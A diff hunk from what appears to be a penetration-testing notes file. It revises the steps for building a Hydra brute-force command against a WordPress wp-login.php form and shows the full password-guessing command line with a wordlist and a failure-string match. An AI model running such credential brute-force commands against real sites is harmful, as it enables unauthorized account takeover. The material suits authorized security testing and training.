@@ -34,9 +34,9 @@ Should be able to populate like below
 hydra -l username -P wordlist.txt TARGETIPADDRESS http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In
 ```
 
-   5. Send a fake request to the site and grab any text indicators of an invalid request \(is incorrect\)
+1. Send a fake request to the site and grab any text indicators of an invalid request \(_is incorrect_ in example below\)
 
-   6. Append to the end of the hydra syntax
+2. Append to the end of the hydra syntax and close double quote
 
 ```
 hydra -l username -P wordlist.txt TARGETIPADDRESS http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:is incorrect"
